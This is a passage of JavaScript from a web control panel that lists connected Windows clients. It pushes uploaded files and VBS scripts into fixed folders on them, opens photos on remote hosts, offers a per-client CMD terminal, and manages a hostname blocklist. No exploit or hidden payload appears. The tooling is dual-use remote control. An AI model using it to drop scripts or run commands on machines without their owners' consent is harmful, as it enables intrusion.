        });
        
        const result = await response.json();
        
        if (response.ok) {
            addLog(`📷 Opening "${filename}" on ${hostname}`, 'success');
        } else {
            addLog(`Failed to display photo on ${hostname}: ${result.error}`, 'error');
        }
    } catch (error) {
        addLog(`Failed to display photo: ${error.message}`, 'error');
    }
}

// Delete photo file
async function deletePhotoFile(filename) {
    if (!confirm(`Delete "${filename}" from library?`)) {
        return;
    }
    
    try {
        const response = await fetch(`${SERVER_URL}/api/photo-files/${encodeURIComponent(filename)}`, {
            method: 'DELETE'
        });
        
        const result = await response.json();
        
        if (response.ok) {
            addLog(`Deleted photo: ${filename}`, 'success');
            loadPhotosLibrary();
        } else {
            addLog(`Failed to delete ${filename}: ${result.error}`, 'error');
        }
    } catch (error) {
        addLog(`Failed to delete photo: ${error.message}`, 'error');
    }
}

// ========== File Dump Functions ==========

// Dump files to C:\Tools on client
async function dumpFilesToClient() {
    const dumpFileInput = document.getElementById('dumpFileInput');
    const dumpClientSelect = document.getElementById('dumpClientSelect');
    const dumpFilesBtn = document.getElementById('dumpFilesBtn');
    
    const clientId = dumpClientSelect.value;
    const files = dumpFileInput.files;
    
    if (!clientId) {
        alert('Please select a target client');
        return;
    }
    
    if (!files || files.length === 0) {
        alert('Please select at least one file to dump');
        return;
    }
    
    const client = clients.find(c => c.id === clientId);
    const hostname = client ? client.hostname : 'Unknown';
    
    // Disable button during upload
    dumpFilesBtn.disabled = true;
    dumpFilesBtn.innerHTML = `
        <span class="flex items-center justify-center space-x-2">
            <svg class="animate-spin h-5 w-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
            </svg>
            <span>Uploading ${files.length} file(s)...</span>
        </span>
    `;
    
    try {
        let successCount = 0;
        let failCount = 0;
        
        for (let file of files) {
            const formData = new FormData();
            formData.append('file', file);
            
            try {
                const response = await fetch(`${SERVER_URL}/api/dump-file/${clientId}`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                
                if (response.ok) {
                    successCount++;
                } else {
                    failCount++;
                    addLog(`Failed to dump "${file.name}" to ${hostname}: ${result.error}`, 'error');
                }
            } catch (error) {
                failCount++;
                addLog(`Error dumping "${file.name}": ${error.message}`, 'error');
            }
        }
        
        if (successCount > 0) {
            addLog(`Successfully dumped ${successCount} file(s) to C:\\Tools on ${hostname}`, 'success');
        }
        
        if (failCount > 0) {
            addLog(`Failed to dump ${failCount} file(s)`, 'error');
        }
        
        // Clear file input
        dumpFileInput.value = '';
        
    } catch (error) {
        addLog(`Error during file dump: ${error.message}`, 'error');
    } finally {
        // Re-enable button
        dumpFilesBtn.disabled = false;
        dumpFilesBtn.innerHTML = `
            <span class="flex items-center justify-center space-x-2">
                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"></path>
                </svg>
                <span>Dump Files to C:\\Tools</span>
            </span>
        `;
    }
}

// ========== Media Dump Functions ==========

// Dump audio files
async function dumpAudioFiles() {
    const fileInput = document.getElementById('audioDumpFileInput');
    const clientSelect = document.getElementById('audioDumpClientSelect');
    const dumpBtn = document.getElementById('audioDumpBtn');
    
    const clientId = clientSelect.value;
    const files = fileInput.files;
    
    if (!clientId) {
        alert('Please select a target client');
        return;
    }
    
    if (!files || files.length === 0) {
        alert('Please select at least one file');
        return;
    }
    
    const client = clients.find(c => c.id === clientId);
    const hostname = client ? client.hostname : 'Unknown';
    
    dumpBtn.disabled = true;
    
    let successCount = 0;
    let failCount = 0;
    
    for (let file of files) {
        const formData = new FormData();
        formData.append('file', file);
        
        try {
            const response = await fetch(`${SERVER_URL}/api/dump-audio/${clientId}`, {
                method: 'POST',
                body: formData
            });
            
            const result = await response.json();
            
            if (response.ok) {
                successCount++;
            } else {
                failCount++;
                addLog(`Failed to dump "${file.name}": ${result.error}`, 'error');
            }
        } catch (error) {
            failCount++;
            addLog(`Error dumping "${file.name}": ${error.message}`, 'error');
        }
    }
    
    if (successCount > 0) {
        addLog(`✅ Dumped ${successCount} audio file(s) to C:\\audios on ${hostname}`, 'success');
    }
    
    if (failCount > 0) {
        addLog(`❌ Failed to dump ${failCount} file(s)`, 'error');
    }
    
    fileInput.value = '';
    dumpBtn.disabled = false;
}

// Dump VBS files
async function dumpVbsFiles() {
    const fileInput = document.getElementById('vbsDumpFileInput');
    const clientSelect = document.getElementById('vbsDumpClientSelect');
    const dumpBtn = document.getElementById('vbsDumpBtn');
    
    const clientId = clientSelect.value;
    const files = fileInput.files;
    
    if (!clientId) {
        alert('Please select a target client');
        return;
    }
    
    if (!files || files.length === 0) {
        alert('Please select at least one file');
        return;
    }
    
    const client = clients.find(c => c.id === clientId);
    const hostname = client ? client.hostname : 'Unknown';
    
    dumpBtn.disabled = true;
    
    let successCount = 0;
    let failCount = 0;
    
    for (let file of files) {
        const formData = new FormData();
        formData.append('file', file);
        
        try {
            const response = await fetch(`${SERVER_URL}/api/dump-vbs/${clientId}`, {
                method: 'POST',
                body: formData
            });
            
            const result = await response.json();
            
            if (response.ok) {
                successCount++;
            } else {
                failCount++;
                addLog(`Failed to dump "${file.name}": ${result.error}`, 'error');
            }
        } catch (error) {
            failCount++;
            addLog(`Error dumping "${file.name}": ${error.message}`, 'error');
        }
    }
    
    if (successCount > 0) {
        addLog(`✅ Dumped ${successCount} VBS script(s) to C:\\scripts on ${hostname}`, 'success');
    }
    
    if (failCount > 0) {
        addLog(`❌ Failed to dump ${failCount} file(s)`, 'error');
    }
    
    fileInput.value = '';
    dumpBtn.disabled = false;
}

// Dump video files
async function dumpVideoFiles() {
    const fileInput = document.getElementById('videoDumpFileInput');
    const clientSelect = document.getElementById('videoDumpClientSelect');
    const dumpBtn = document.getElementById('videoDumpBtn');
    
    const clientId = clientSelect.value;
    const files = fileInput.files;
    
    if (!clientId) {
        alert('Please select a target client');
        return;
    }
    
    if (!files || files.length === 0) {
        alert('Please select at least one file');
        return;
    }
    
    const client = clients.find(c => c.id === clientId);
    const hostname = client ? client.hostname : 'Unknown';
    
    dumpBtn.disabled = true;
    
    let successCount = 0;
    let failCount = 0;
    
    for (let file of files) {
        const formData = new FormData();
        formData.append('file', file);
        
        try {
            const response = await fetch(`${SERVER_URL}/api/dump-video/${clientId}`, {
                method: 'POST',
                body: formData
            });
            
            const result = await response.json();
            
            if (response.ok) {
                successCount++;
            } else {
                failCount++;
                addLog(`Failed to dump "${file.name}": ${result.error}`, 'error');
            }
        } catch (error) {
            failCount++;
            addLog(`Error dumping "${file.name}": ${error.message}`, 'error');
        }
    }
    
    if (successCount > 0) {
        addLog(`✅ Dumped ${successCount} video file(s) to C:\\videos on ${hostname}`, 'success');
    }
    
    if (failCount > 0) {
        addLog(`❌ Failed to dump ${failCount} file(s)`, 'error');
    }
    
    fileInput.value = '';
    dumpBtn.disabled = false;
}

// Dump photo files
async function dumpPhotoFiles() {
    const fileInput = document.getElementById('photosDumpFileInput');
    const clientSelect = document.getElementById('photosDumpClientSelect');
    const dumpBtn = document.getElementById('photosDumpBtn');
    
    const clientId = clientSelect.value;
    const files = fileInput.files;
    
    if (!clientId) {
        alert('Please select a target client');
        return;
    }
    
    if (!files || files.length === 0) {
        alert('Please select at least one file');
        return;
    }
    
    const client = clients.find(c => c.id === clientId);
    const hostname = client ? client.hostname : 'Unknown';
    
    dumpBtn.disabled = true;
    
    let successCount = 0;
    let failCount = 0;
    
    for (let file of files) {
        const formData = new FormData();
        formData.append('file', file);
        
        try {
            const response = await fetch(`${SERVER_URL}/api/dump-photo/${clientId}`, {
                method: 'POST',
                body: formData
            });
            
            const result = await response.json();
            
            if (response.ok) {
                successCount++;
            } else {
                failCount++;
                addLog(`Failed to dump "${file.name}": ${result.error}`, 'error');
            }
        } catch (error) {
            failCount++;
            addLog(`Error dumping "${file.name}": ${error.message}`, 'error');
        }
    }
    
    if (successCount > 0) {
        addLog(`✅ Dumped ${successCount} photo(s) to C:\\photos on ${hostname}`, 'success');
    }
    
    if (failCount > 0) {
        addLog(`❌ Failed to dump ${failCount} file(s)`, 'error');
    }
    
    fileInput.value = '';
    dumpBtn.disabled = false;
}

// ========== Client IDs Table Functions ==========

function loadClientIdsTable() {
    const clientIdsTable = document.getElementById('clientIdsTable');
    
    if (!clients || clients.length === 0) {
        clientIdsTable.innerHTML = '<p class="text-gh-text-secondary text-sm text-center py-4">No clients connected</p>';
        return;
    }
    
    clientIdsTable.innerHTML = `
        <div class="overflow-x-auto">
            <table class="w-full text-sm">
                <thead>
                    <tr class="border-b border-gh-border">
                        <th class="text-left py-3 px-4 text-gh-text font-semibold">Status</th>
                        <th class="text-left py-3 px-4 text-gh-text font-semibold">Hostname</th>
                        <th class="text-left py-3 px-4 text-gh-text font-semibold">IP Address</th>
                        <th class="text-left py-3 px-4 text-gh-text font-semibold">Client ID</th>
                        <th class="text-left py-3 px-4 text-gh-text font-semibold">Type</th>
                        <th class="text-left py-3 px-4 text-gh-text font-semibold">Last Seen</th>
                        <th class="text-left py-3 px-4 text-gh-text font-semibold">Actions</th>
                    </tr>
                </thead>
                <tbody>
                    ${clients.map(client => `
                        <tr class="border-b border-gh-border hover:bg-gh-bg-tertiary transition-colors">
                            <td class="py-3 px-4">
                                <span class="inline-flex items-center px-2 py-1 rounded-full text-xs font-semibold ${client.connected ? 'bg-green-900 text-green-300 border border-green-700' : 'bg-red-900 text-red-300 border border-red-700'}">
                                    ${client.connected ? '● Online' : '● Offline'}
                                </span>
                            </td>
                            <td class="py-3 px-4 text-gh-text font-medium">${client.hostname}</td>
                            <td class="py-3 px-4 text-gh-text-secondary font-mono text-xs">${client.ip}</td>
                            <td class="py-3 px-4">
                                <div class="flex items-center space-x-2">
                                    <code class="text-gh-text-secondary bg-gh-bg px-2 py-1 rounded text-xs font-mono">${client.id}</code>
                                    <button onclick="copyToClipboard('${client.id}')" class="text-blue-400 hover:text-blue-300 transition-colors" title="Copy ID">
                                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path>
                                        </svg>
                                    </button>
                                </div>
                            </td>
                            <td class="py-3 px-4">
                                ${client.id.startsWith('client') ? '<span class="inline-flex items-center px-2 py-1 rounded-full text-xs font-semibold bg-blue-900 text-blue-300 border border-blue-700">✨ Latest</span>' : '<span class="text-gh-text-muted text-xs">Legacy</span>'}
                            </td>
                            <td class="py-3 px-4 text-gh-text-secondary text-xs">${new Date(client.lastSeen).toLocaleString()}</td>
                            <td class="py-3 px-4">
                                <button onclick="openCmdTerminal('${client.id}')" ${!client.connected ? 'disabled' : ''} class="text-green-400 hover:text-green-300 transition-colors disabled:text-gray-600 disabled:cursor-not-allowed" title="Open CMD">
                                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
                                    </svg>
                                </button>
                            </td>
                        </tr>
                    `).join('')}
                </tbody>
            </table>
        </div>
    `;
}

// Copy to clipboard function
function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        addLog(`📋 Copied to clipboard: ${text}`, 'info');
    }).catch(err => {
        addLog(`Failed to copy: ${err.message}`, 'error');
    });
}

// Clear logs function
function clearLogs() {
    const logsEl = document.getElementById('logs');
    logsEl.innerHTML = '<p class="log-entry text-green-300 font-mono text-sm">[System] Logs cleared</p>';
    addLog('Logs cleared by user', 'info');
}

// ========== Blocklist Management Functions ==========

// Load blocklist
async function loadBlocklist() {
    const blocklistTable = document.getElementById('blocklistTable');
    
    try {
        const token = localStorage.getItem('authToken');
        const response = await fetch(`${SERVER_URL}/api/blocklist`, {
            headers: {
                'Authorization': `Bearer ${token}`,
                'Content-Type': 'application/json'
            },
            credentials: 'include'
        });
        
        if (response.status === 401) {
            await logout();
            return;
        }
        
        const blocklist = await response.json();
        
        if (!blocklist || blocklist.length === 0) {
            blocklistTable.innerHTML = '<p class="text-gh-text-secondary text-sm text-center py-4">No blocked clients</p>';
            return;
        }
        
        blocklistTable.innerHTML = `
            <div class="space-y-2">
                ${blocklist.map(item => `
                    <div class="bg-gh-bg-tertiary border border-gh-border rounded-lg p-4 flex items-center justify-between">
                        <div class="flex-1">
                            <div class="flex items-center space-x-3">
                                <div class="w-10 h-10 bg-red-900 rounded-lg flex items-center justify-center">
                                    <svg class="w-5 h-5 text-red-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path>
                                    </svg>
                                </div>
                                <div>
                                    <p class="text-gh-text font-semibold">${item.hostname}</p>
                                    <p class="text-gh-text-secondary text-xs mt-1">Added by ${item.addedBy || 'Unknown'} on ${new Date(item.addedAt).toLocaleString()}</p>
                                </div>
                            </div>
                        </div>
                        <button onclick="removeFromBlocklist('${item.hostname}')" 
                            class="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-lg font-semibold text-sm transition-colors">
                            <span class="flex items-center space-x-2">
                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
                                </svg>
                                <span>Unblock</span>
                            </span>
                        </button>
                    </div>
                `).join('')}
            </div>
        `;
    } catch (error) {
        console.error('Failed to load blocklist:', error);
        blocklistTable.innerHTML = '<p class="text-red-300 text-sm text-center py-4">Failed to load blocklist</p>';
        addLog('Failed to load blocklist', 'error');
    }
}

// Add hostname to blocklist
async function addToBlocklist() {
    const hostnameInput = document.getElementById('blocklistHostnameInput');
    const hostname = hostnameInput.value.trim();
    
    if (!hostname) {
        alert('Please enter a computer name');
        return;
    }
    
    try {
        const token = localStorage.getItem('authToken');
        const response = await fetch(`${SERVER_URL}/api/blocklist`, {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${token}`,
                'Content-Type': 'application/json'
            },
            credentials: 'include',
            body: JSON.stringify({ hostname })
        });
        
        const result = await response.json();
        
        if (response.ok) {
            addLog(`🚫 Added "${hostname}" to blocklist`, 'success');
            hostnameInput.value = '';
            loadBlocklist(); // Reload the list
        } else {
            addLog(`Failed to add to blocklist: ${result.error}`, 'error');
            alert(result.error || 'Failed to add to blocklist');
        }
    } catch (error) {
        console.error('Error adding to blocklist:', error);
        addLog(`Error adding to blocklist: ${error.message}`, 'error');
    }
}

// Remove hostname from blocklist
async function removeFromBlocklist(hostname) {
    if (!confirm(`Unblock "${hostname}"? They will be able to connect again.`)) {
        return;
    }
    
    try {
        const token = localStorage.getItem('authToken');
        const response = await fetch(`${SERVER_URL}/api/blocklist/${encodeURIComponent(hostname)}`, {
            method: 'DELETE',
            headers: {
                'Authorization': `Bearer ${token}`,
                'Content-Type': 'application/json'
            },
            credentials: 'include'
        });
        
        const result = await response.json();
        
        if (response.ok) {
            addLog(`✅ Removed "${hostname}" from blocklist`, 'success');
            loadBlocklist(); // Reload the list
        } else {
            addLog(`Failed to remove from blocklist: ${result.error}`, 'error');
        }
    } catch (error) {
        console.error('Error removing from blocklist:', error);
        addLog(`Error removing from blocklist: ${error.message}`, 'error');
    }
}

// Quick add to blocklist from clients list (can be called from client cards)
function quickBlockClient(hostname) {
    if (confirm(`Block "${hostname}" from connecting to the server?`)) {
        document.getElementById('blocklistHostnameInput').value = hostname;
        switchOtherMainTab('blocklist');
        // Auto-submit after a short delay to show the user what's happening
        setTimeout(() => {
            addToBlocklist();
        }, 500);
    }
}

// Initialize
checkAuthentication();
// loadClients() is now called from checkAuthentication() and login() when needed

// Initialize client select listeners after DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeClientSelectListeners);
} else {
    initializeClientSelectListeners();
}
